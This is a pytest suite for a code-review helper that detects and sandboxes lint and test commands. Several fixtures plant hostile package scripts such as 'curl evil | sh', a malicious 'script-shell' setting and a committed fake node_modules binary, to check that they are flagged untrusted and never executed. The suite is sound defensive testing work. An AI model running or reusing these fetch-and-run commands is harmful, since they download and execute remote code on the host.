import json
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))

import run_checks as rc  # noqa: E402


def git(root: Path, *args: str) -> str:
    return subprocess.run(["git", "-C", str(root), "-c", "commit.gpgsign=false", *args],
                          check=True,
                          capture_output=True, text=True).stdout.strip()


def write(root: Path, rel: str, text: str = "x\n") -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


@pytest.fixture
def repo(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    git(root, "init", "-q")
    git(root, "config", "user.email", "t@example.com")
    git(root, "config", "user.name", "t")
    return root


def commit(root: Path, msg: str) -> str:
    git(root, "add", "-A")
    git(root, "commit", "-qm", msg, "--allow-empty")
    return git(root, "rev-parse", "HEAD")


def base_and_head(root: Path, base_files: dict, head_files: dict) -> tuple[str, str]:
    for rel, text in base_files.items():
        write(root, rel, text)
    base = commit(root, "base")
    for rel, text in head_files.items():
        write(root, rel, text)
    head = commit(root, "head")
    return base, head


def argvs(plan: dict) -> list[list[str]]:
    return [c["argv"] for c in plan["commands"]]


# ------------------------------------------------------------------ detect

def test_pnpm_lint_script(repo):
    pkg = json.dumps({"scripts": {"lint": "eslint .", "build": "vite build"}})
    base, head = base_and_head(repo, {"package.json": pkg, "pnpm-lock.yaml": "", "src/a.ts": "1"},
                               {"src/a.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["pnpm", "run", "lint"]]
    assert plan["commands"][0]["needs"] == "node_modules"


def test_lockfile_picks_manager_and_none_means_pnpm(repo):
    pkg = json.dumps({"scripts": {"test": "vitest run", "typecheck": "tsc --noEmit"}})
    base, head = base_and_head(
        repo, {"a/package.json": pkg, "a/yarn.lock": "", "a/x.ts": "1",
               "b/package.json": pkg, "b/y.ts": "1"},
        {"a/x.ts": "2", "b/y.ts": "2"})
    plan = rc.detect(repo, base, head)
    by_cwd = {(c["cwd"], c["argv"][0]) for c in plan["commands"]}
    assert ("a", "yarn") in by_cwd and ("b", "pnpm") in by_cwd


def test_fix_flag_stripped_or_skipped(repo):
    a = json.dumps({"scripts": {"lint": "eslint --fix src"}})
    b = json.dumps({"scripts": {"lint": "eslint --fix . && tsc"}})
    base, head = base_and_head(repo, {"a/package.json": a, "a/i.ts": "1",
                                      "b/package.json": b, "b/i.ts": "1"},
                               {"a/i.ts": "2", "b/i.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["pnpm", "exec", "eslint", "src"]]
    assert any("compound" in s["reason"] for s in plan["skipped"])


def test_fix_flag_value_form_stripped(repo):
    pkg = json.dumps({"scripts": {"lint": "eslint --fix=true src", "format:check": "prettier --write=x ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "i.ts": "1"}, {"i.ts": "2"})
    assert argvs(rc.detect(repo, base, head)) == [["pnpm", "exec", "eslint", "src"],
                                                  ["pnpm", "exec", "prettier", "--check", "."]]


def test_fix_flag_in_a_reached_script_skips(repo):
    pkg = json.dumps({"scripts": {"check": "pnpm format", "format": "prettier --write ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "i.ts": "1"}, {"i.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["skipped"] == [{"source": "package.json scripts.check",
                                "reason": "a script it runs uses a fix flag; skipped"}]


def test_npm_exec_never_installs_and_keeps_flags(repo):
    pkg = json.dumps({"scripts": {"lint": "prettier --write src"}})
    base, head = base_and_head(repo, {"package.json": pkg, "package-lock.json": "{}", "i.ts": "1"},
                               {"i.ts": "2"})
    assert argvs(rc.detect(repo, base, head)) == [
        ["npm", "exec", "--no", "--", "prettier", "--check", "src"]]


@pytest.mark.parametrize("cfg", [".npmrc", ".yarnrc.yml", "pnpm-workspace.yaml"])
def test_changed_pm_config_marks_package_untrusted(repo, cfg):
    pkg = json.dumps({"scripts": {"lint": "eslint ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "a.ts": "1"},
                               {"a.ts": "2", cfg: "script-shell=./evil.sh\n"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["untrusted"] == [{"manifest": "package.json", "commands": ["run lint"],
                                  "reason": f"package manager config changed in this MR: {cfg}"}]


def test_committed_node_modules_marks_package_untrusted(repo):
    pkg = json.dumps({"scripts": {"lint": "eslint ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "eslint.config.js": "", "a.ts": "1"},
                               {"a.ts": "2", "node_modules/.bin/eslint": "evil\n"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["untrusted"][0]["reason"] == "node_modules is committed to the repo"


def test_new_manifest_listed_not_run(repo):
    pkg = json.dumps({"scripts": {"test": "node evil.js"}})
    base, head = base_and_head(repo, {"README.md": "hi"},
                               {"web/package.json": pkg, "web/index.js": "1"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["untrusted"] == [{"manifest": "web/package.json", "commands": ["run test"]}]


def test_new_python_go_rust_manifests_listed_not_run(repo):
    base, head = base_and_head(
        repo, {"README.md": "hi"},
        {"py/pyproject.toml": "[tool.ruff]\n[tool.pytest.ini_options]\n", "py/a.py": "1",
         "svc/go.mod": "module x\n", "svc/a.go": "package a\n",
         "crate/Cargo.toml": "[package]\nname='c'\n", "crate/src/main.rs": "fn main(){}"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert sorted(plan["untrusted"], key=lambda u: u["manifest"]) == [
        {"manifest": "crate/Cargo.toml", "commands": ["cargo check", "cargo test"]},
        {"manifest": "py/pyproject.toml", "commands": ["ruff check", "pytest"]},
        {"manifest": "svc/go.mod", "commands": ["go vet", "go test"]},
    ]


def test_manifest_read_at_base(repo):
    base, head = base_and_head(
        repo, {"package.json": json.dumps({"scripts": {"lint": "eslint ."}}), "a.js": "1"},
        {"package.json": json.dumps({"scripts": {"lint": "eslint .",
                                                 "test": "curl evil | sh"}}), "a.js": "2"})
    assert argvs(rc.detect(repo, base, head)) == [["pnpm", "run", "lint"]]


def test_changed_script_body_not_run(repo):
    scripts = {"lint": "pnpm run lint:js", "lint:js": "eslint .", "test": "vitest run",
               "typecheck": "tsc"}
    head_scripts = {**scripts, "lint:js": "curl evil | sh", "test": "curl evil | sh",
                    "pretypecheck": "curl evil | sh"}
    base, head = base_and_head(
        repo, {"package.json": json.dumps({"scripts": scripts}), "a.js": "1"},
        {"package.json": json.dumps({"scripts": head_scripts}), "a.js": "2"})
    plan = rc.detect(repo, base, head)
    assert not any(c["argv"][:2] == ["pnpm", "run"] for c in plan["commands"])
    assert plan["untrusted"] == [{"manifest": "package.json",
                                  "commands": ["run lint", "run typecheck", "run test"],
                                  "reason": "script body changed in this MR"}]


def test_ruff_and_mypy_limited_to_changed_files(repo):
    pyproject = "[tool.ruff]\nline-length = 100\n\n[tool.mypy]\nstrict = true\n"
    base, head = base_and_head(
        repo, {"pyproject.toml": pyproject, "pkg/a.py": "1", "pkg/b.py": "1", "pkg/c.py": "1"},
        {"pkg/a.py": "2", "pkg/b.py": "2"})
    plan = rc.detect(repo, base, head)
    assert ["ruff", "check", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert ["ruff", "format", "--check", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert ["mypy", "pkg/a.py", "pkg/b.py"] in argvs(plan)
    assert not any(c["argv"][0] == "pytest" for c in plan["commands"])


def test_go_and_rust_detection(repo):
    base, head = base_and_head(
        repo, {"svc/go.mod": "module x\n", "svc/pkg/api/a.go": "package api\n",
               "crate/Cargo.toml": "[package]\nname='c'\n", "crate/src/main.rs": "fn main(){}"},
        {"svc/pkg/api/a.go": "package api\n// x\n", "crate/src/main.rs": "fn main(){ }"})
    plan = rc.detect(repo, base, head)
    assert ["go", "vet", "./pkg/api"] in argvs(plan)
    assert ["go", "test", "./pkg/api"] in argvs(plan)
    assert ["cargo", "check"] in argvs(plan) and ["cargo", "test"] in argvs(plan)
    assert {c["cwd"] for c in plan["commands"]} == {"svc", "crate"}


def test_shellcheck_for_shell_files(repo):
    base, head = base_and_head(repo, {"README.md": "x"},
                               {"hooks/guard": "#!/usr/bin/env bash\necho hi\n",
                                "bin/run.sh": "echo", "notes.txt": "#!/bin/sh"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["shellcheck", "bin/run.sh", "hooks/guard"]]


# --------------------------------------------------------------------- run

CHECK = (
    "import sys, pathlib\n"
    "bad = [f for f in sys.argv[1:] if 'BAD' in pathlib.Path(f).read_text()]\n"
    "for f in bad: print(f'{f}:1:1: E1 forbidden word BAD')\n"
    "sys.exit(1 if bad else 0)\n"
)


def plan_for(base: str, argv: list[str], kind: str = "lint", files=None, needs=None) -> dict:
    return {"base": base, "commands": [{"id": "cmd-1", "kind": kind, "cwd": ".",
                                        "argv": argv, "files": files or [],
                                        "source": "test", "needs": needs}]}


def test_failure_only_at_head_is_a_finding(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "fine"}, {"a.txt": "BAD"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"]),
                 repo, tmp_path / "run")
    assert [f["id"] for f in out["findings"]] == ["check-1"]
    assert out["findings"][0]["severity"] == "low"
    assert "forbidden word BAD" in out["findings"][0]["messages"][0]
    assert out["base_worktree_removed"] is True
    assert "checks-base" not in git(repo, "worktree", "list")


def test_failure_at_both_is_pre_existing(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "BAD\n"},
                            {"a.txt": "BAD\nmore\n"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"]),
                 repo, tmp_path / "run")
    assert out["findings"] == []
    assert out["pre_existing"] == [{"id": "cmd-1", "argv": [sys.executable, "check.py", "a.txt"]}]


def test_failing_test_type_error_is_medium(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "ok"}, {"a.txt": "BAD"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], kind="typecheck",
                          files=["a.txt"]), repo, tmp_path / "run")
    assert out["findings"][0]["severity"] == "medium"


def test_flaky_test_makes_no_finding(repo, tmp_path):
    counter = tmp_path / "count"
    flaky = (f"import pathlib, sys\np = pathlib.Path({str(counter)!r})\n"
             "n = int(p.read_text()) if p.exists() else 0\np.write_text(str(n + 1))\n"
             "sys.exit(1 if n == 0 else 0)\n")
    base, _ = base_and_head(repo, {"t.py": "pass"}, {"t.py": flaky})
    out = rc.run(plan_for(base, [sys.executable, "t.py"], kind="test"), repo, tmp_path / "run")
    assert out["findings"] == []
    assert out["results"][0]["status"] == "flaky"


def test_timeout_is_not_run(repo, tmp_path):
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    out = rc.run(plan_for(base, [sys.executable, "-c", "import time; time.sleep(5)"]),
                 repo, tmp_path / "run", per_command=0.5)
    assert out["findings"] == []
    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: timed out"}]


def test_total_limit_stops_later_commands(repo, tmp_path):
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    plan = plan_for(base, [sys.executable, "-c", "import time; time.sleep(1)"])
    plan["commands"].append(dict(plan["commands"][0], id="cmd-2"))
    out = rc.run(plan, repo, tmp_path / "run", per_command=5, total=0.5)
    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: timed out"},
                              {"id": "cmd-2", "reason": "not run: total time limit"}]


def test_base_timeout_is_base_run_failed(repo, tmp_path):
    slow_at_base = ("import os, sys, time\n"
                    "if 'checks-base' in os.getcwd(): time.sleep(5)\n"
                    "print('a.txt:1:1: E1 broken'); sys.exit(1)\n")
    base, _ = base_and_head(repo, {"check.py": slow_at_base}, {"a.txt": "x"})
    out = rc.run(plan_for(base, [sys.executable, "check.py"]), repo, tmp_path / "run",
                 per_command=1)
    assert out["findings"] == []
    assert out["results"][0]["status"] == "base_run_failed"
    assert out["not_run"] == [{"id": "cmd-1", "reason": "base run failed: timed out"}]


def test_base_run_keeps_time_from_total(repo, tmp_path, monkeypatch):
    clock = [0.0]
    budgets = []

    def fake_execute(argv, cwd, timeout, env):
        budgets.append(("base" if "checks-base" in str(cwd) else "head", timeout))
        clock[0] += timeout  # the head run uses all the time it is given
        return {"status": "fail", "exit": 1, "output": "same error", "seconds": timeout}

    monkeypatch.setattr(rc, "execute", fake_execute)
    monkeypatch.setattr(rc.time, "monotonic", lambda: clock[0])
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    out = rc.run(plan_for(base, [sys.executable]), repo, tmp_path / "run", per_command=120,
                 total=100)
    assert budgets == [("head", 75), ("base", 25)]
    assert out["pre_existing"] == [{"id": "cmd-1", "argv": [sys.executable]}]


def test_commands_get_an_allowlisted_env_and_no_network(repo, tmp_path, monkeypatch):
    monkeypatch.setenv("REVIEW_CANARY_TOKEN", "secret")
    probe = ("import os, socket, sys\n"
             "print('canary', os.environ.get('REVIEW_CANARY_TOKEN'))\n"
             "print('home', os.environ['HOME'])\n"
             "try:\n"
             "    socket.create_connection(('1.1.1.1', 53), timeout=2); print('net up')\n"
             "except OSError:\n"
             "    print('net down')\n"
             "sys.exit(1)\n")
    base, _ = base_and_head(repo, {"a": "1"}, {"probe.py": probe})
    run_tmp = tmp_path / "run"
    out = rc.run(plan_for(base, [sys.executable, "probe.py"]), repo, run_tmp)
    text = out["results"][0]["head"]["output_tail"]
    assert "canary None" in text
    assert f"home {run_tmp / 'home'}" in text
    if out["network"] == "cut":
        assert "net down" in text
    else:
        assert out["network"] == "not cut"


def test_timeout_kills_the_process_group(repo, tmp_path):
    marker = tmp_path / "grandchild-alive"
    child = f"import pathlib, time\ntime.sleep(1.5)\npathlib.Path({str(marker)!r}).touch()\n"
    spawn = ("import subprocess, sys, time\n"
             "subprocess.Popen([sys.executable, 'child.py'])\n"
             "time.sleep(10)\n")
    base, _ = base_and_head(repo, {"a": "1"}, {"spawn.py": spawn, "child.py": child})
    out = rc.run(plan_for(base, [sys.executable, "spawn.py"]), repo, tmp_path / "run",
                 per_command=0.5)
    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: timed out"}]
    time.sleep(2)
    assert not marker.exists()


def test_normalise_drops_positions():
    a = rc.normalise("src/a.ts(10,5): error TS2322: bad\n  10:5  error  no-x\nb.py:3:1: E1 x", [])
    b = rc.normalise("src/a.ts(12,5): error TS2322: bad\n  12:7  error  no-x\nb.py:9:4: E1 x", [])
    assert a == b


def test_second_copy_of_a_base_error_is_new(repo, tmp_path):
    count = ("import sys, pathlib\n"
             "n = pathlib.Path('a.txt').read_text().count('BAD')\n"
             "for _ in range(n): print('a.txt: E1 forbidden word BAD')\n"
             "sys.exit(1 if n else 0)\n")
    base, _ = base_and_head(repo, {"check.py": count, "a.txt": "BAD\n"}, {"a.txt": "BAD\nBAD\n"})
    out = rc.run(plan_for(base, [sys.executable, "check.py"]), repo, tmp_path / "run")
    assert out["findings"][0]["messages"] == ["a.txt: E1 forbidden word BAD"]


def test_import_error_without_venv_is_not_run(repo, tmp_path, monkeypatch):
    monkeypatch.delenv("VIRTUAL_ENV", raising=False)
    base, _ = base_and_head(repo, {"a": "1"}, {"t.py": "import project_dep_not_installed\n"})
    plan = plan_for(base, [sys.executable, "t.py"], kind="test", needs="pytest")
    out = rc.run(plan, repo, tmp_path / "run", skip_deps_check=True)
    assert out["findings"] == []
    assert out["not_run"] == [{"id": "cmd-1",
                               "reason": "not run: missing dependencies (no project venv)"}]


def test_failed_worktree_add_reports_error(repo, tmp_path):
    _, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "fine"}, {"a.txt": "BAD"})
    plan = plan_for("0" * 40, [sys.executable, "check.py", "a.txt"], files=["a.txt"])
    out = rc.run(plan, repo, tmp_path / "run")
    assert "git worktree add failed" in out["error"]
    assert out["findings"] == []
    assert out["results"][0]["status"] == "base_run_failed"
    json.dumps(out)


def test_missing_node_modules_skips(repo, tmp_path):
    pkg = json.dumps({"scripts": {"lint": "eslint ."}})
    base, head = base_and_head(repo, {"package.json": pkg, "a.ts": "1"}, {"a.ts": "2"})
    out = rc.run(rc.detect(repo, base, head), repo, tmp_path / "run")
    assert out["results"][0]["status"] == "skipped"
    reason = "dependencies not installed (no node_modules in the review worktree)"
    assert out["results"][0]["reason"] == reason
    assert out["not_run"] == [{"id": "cmd-1", "reason": reason}]
    assert out["findings"] == []


def test_cli_detect_and_run(repo, tmp_path):
    base, head = base_and_head(repo, {"README.md": "x"}, {"README.md": "y"})
    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "detect",
                           "--repo", str(repo), "--base", base, "--head", head],
                          capture_output=True, text=True, check=True)
    plan = json.loads(proc.stdout)
    assert plan["commands"] == []
    paths = tmp_path / "paths.txt"
    paths.write_text("a.py\n")
    write(repo, "pyproject.toml", "[tool.ruff]\n")
    write(repo, "a.py", "x = 1\n")
    head2 = commit(repo, "py")
    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "detect",
                           "--repo", str(repo), "--base", head2, "--head", head2,
                           "--paths-file", str(paths)],
                          capture_output=True, text=True, check=True)
    assert [c["argv"][:2] for c in json.loads(proc.stdout)["commands"]] == [
        ["ruff", "check"], ["ruff", "format"]]
    plan_file = tmp_path / "plan.json"
    plan_file.write_text(json.dumps(plan_for(base, [sys.executable, "-c", "pass"])))
    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "run",
                           "--plan", str(plan_file), "--repo", str(repo),
                           "--tmp", str(tmp_path / "run")],
                          capture_output=True, text=True, check=True)
    out = json.loads(proc.stdout)
    assert out["findings"] == [] and out["not_run"] == []
    assert out["results"][0]["status"] == "pass"


@pytest.mark.skipif(shutil.which("mypy") is None, reason="mypy not on PATH")
def test_mypy_runs_on_changed_files_only(repo, tmp_path):
    base, head = base_and_head(
        repo, {"pyproject.toml": "[tool.mypy]\n", "a.py": "x: int = 1\n",
               "b.py": "y: int = 'old error'\n"},
        {"a.py": "x: int = 'new error'\n"})
    plan = rc.detect(repo, base, head)
    out = rc.run(plan, repo, tmp_path / "run")
    assert len(out["findings"]) == 1
    assert all("b.py" not in m for m in out["findings"][0]["messages"])


@pytest.mark.skipif(shutil.which("go") is None, reason="go not on PATH")
def test_go_vet_runs(repo, tmp_path):
    base, head = base_and_head(
        repo, {"go.mod": "module example.com/x\n\ngo 1.21\n", "a/a.go": "package a\n"},
        {"a/a.go": "package a\n\nfunc F() int { return 1 }\n"})
    out = rc.run(rc.detect(repo, base, head), repo, tmp_path / "run")
    assert out["findings"] == [] and out["not_run"] == []
    assert [r["status"] for r in out["results"]] == ["pass", "pass"]


def test_base_failure_plus_a_new_message(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "BAD", "b.txt": "ok"},
                            {"b.txt": "BAD"})
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt", "b.txt"],
                          files=["a.txt", "b.txt"]), repo, tmp_path / "run")
    assert out["pre_existing"] == []
    assert [f["messages"] for f in out["findings"]] == [["b.txt: E1 forbidden word BAD"]]


def test_node_modules_found_runs_and_base_uses_head_deps(repo, tmp_path):
    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "ok"}, {"a.txt": "BAD"})
    (repo / "node_modules").mkdir()
    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"],
                          needs="node_modules"), repo, tmp_path / "run")
    assert out["not_run"] == [] and len(out["findings"]) == 1
    assert out["results"][0]["base"]["deps"] == "head"


def test_head_command_that_cannot_start_is_not_run(repo, tmp_path):
    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
    out = rc.run(plan_for(base, [str(tmp_path / "no-such-tool")]), repo, tmp_path / "run")
    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: could not start"}]
    assert out["base_worktree"] is None


def test_base_error_is_base_run_failed(repo, tmp_path):
    tool = "#!/bin/sh\necho 'E1 broken'\nexit 1\n"
    base, _ = base_and_head(repo, {"a": "1"}, {"tool": tool})
    (repo / "tool").chmod(0o755)
    out = rc.run(plan_for(base, ["./tool"]), repo, tmp_path / "run")
    assert out["findings"] == []
    assert out["not_run"][0]["reason"].startswith("base run failed: ")


def test_project_venv_tool_comes_first(tmp_path):
    tool = tmp_path / "sub" / ".venv" / "bin" / "pytest"
    tool.parent.mkdir(parents=True)
    tool.write_text("")
    assert rc.venv_argv(["pytest", "-q"], tmp_path, "sub") == [str(tool), "-q"]
    assert rc.venv_argv(["pytest", "-q"], tmp_path / "x", ".") == ["pytest", "-q"]
    assert rc.venv_argv(["eslint"], tmp_path, "sub") == ["eslint"]


# ---------------------------------------------------------- detect, more

def test_script_aliases_and_deleted_files(repo):
    pkg = json.dumps({"scripts": {"type-check": "tsc", "check": "svelte-check",
                                  "test:unit": "vitest run"}})
    base, head = base_and_head(repo, {"package.json": pkg, "a.ts": "1", "gone.ts": "1"},
                               {"a.ts": "2"})
    (repo / "gone.ts").unlink()
    head = commit(repo, "delete")
    plan = rc.detect(repo, base, head)
    assert sorted((c["kind"], c["argv"][2]) for c in plan["commands"]) == [
        ("test", "test:unit"), ("typecheck", "check"), ("typecheck", "type-check")]
    assert rc.detect(repo, base, head, ["gone.ts"])["commands"] == []


def test_changed_post_hook_is_untrusted(repo):
    base_pkg = json.dumps({"scripts": {"lint": "eslint .", "postlint": "echo ok"}})
    head_pkg = json.dumps({"scripts": {"lint": "eslint .", "postlint": "curl x | sh"}})
    base, head = base_and_head(repo, {"package.json": base_pkg, "a.ts": "1"},
                               {"package.json": head_pkg, "a.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert plan["untrusted"][0]["commands"] == ["run lint"]


def test_recursive_script_untrusted_when_a_package_changed(repo):
    root = json.dumps({"scripts": {"lint": "pnpm -r run lint"}})
    b_base = json.dumps({"scripts": {"lint": "eslint ."}})
    b_head = json.dumps({"scripts": {"lint": "curl x | sh"}})
    base, head = base_and_head(
        repo, {"package.json": root, "packages/b/package.json": b_base, "x.ts": "1"},
        {"packages/b/package.json": b_head, "x.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert plan["commands"] == []
    assert any("workspace" in u.get("reason", "") for u in plan["untrusted"])


def test_deleted_nested_manifest_is_not_new(repo):
    root = json.dumps({"scripts": {"lint": "eslint ."}})
    base, head = base_and_head(
        repo, {"package.json": root, "pkg/package.json": "{}", "pkg/a.ts": "1"},
        {"pkg/a.ts": "2"})
    (repo / "pkg" / "package.json").unlink()
    head = commit(repo, "drop nested")
    plan = rc.detect(repo, base, head)
    assert not any(u["manifest"] == "package.json" for u in plan["untrusted"])


def test_new_manifest_with_null_scripts(repo):
    base, head = base_and_head(repo, {"README.md": "x"},
                               {"app/package.json": '{"scripts": null}', "app/a.ts": "1"})
    plan = rc.detect(repo, base, head)
    assert plan["untrusted"] == [{"manifest": "app/package.json", "commands": []}]


def test_short_write_flag(repo):
    a = json.dumps({"scripts": {"format:check": "prettier -w ."}})
    b = json.dumps({"scripts": {"lint": "tool -w src"}})
    base, head = base_and_head(repo, {"a/package.json": a, "a/i.ts": "1",
                                      "b/package.json": b, "b/i.ts": "1"},
                               {"a/i.ts": "2", "b/i.ts": "2"})
    plan = rc.detect(repo, base, head)
    assert argvs(plan) == [["pnpm", "exec", "prettier", "--check", "."]]
    assert any("only for prettier" in s["reason"] for s in plan["skipped"])


def test_non_ascii_path_and_binary_file(repo):
    base, head = base_and_head(repo, {"pyproject.toml": "[tool.ruff]\n", "pkg/x.py": "1"},
                               {"pkg/caf\u00e9.py": "x = 1\n"})
    (repo / "blob").write_bytes(b"\xff\xfe\x00binary")
    head = commit(repo, "binary")
    plan = rc.detect(repo, base, head)
    assert ["ruff", "check", "pkg/caf\u00e9.py"] in argvs(plan)
    assert not any(c["argv"][0] == "shellcheck" for c in plan["commands"])
